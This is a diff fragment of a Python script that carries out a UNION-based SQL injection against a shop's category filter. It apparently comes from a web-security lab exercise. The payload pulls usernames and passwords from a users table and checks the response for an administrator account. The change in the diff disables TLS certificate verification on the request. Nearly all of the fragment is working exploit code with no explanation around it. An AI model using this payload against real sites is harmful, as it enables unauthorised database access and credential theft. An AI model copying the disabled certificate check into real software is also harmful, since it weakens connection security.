@@ -9,7 +9,7 @@ headers= {'user-agent':'Mozilla/5.0'}
 def exploit_sqli(url):
     path='/filter?category=Gifts'
     payload= " 'UNION+SELECT+NULL+username||'~'||password+from+users-- "
-    r= requests.get(url+path+payload,headers=headers,proxies=proxies)
+    r= requests.get(url+path+payload,headers=headers,proxies=proxies,verify=False)
     res = r.text
     if 'administrator' in res:
         parse=BeautifulSoup(res,'html.parser')
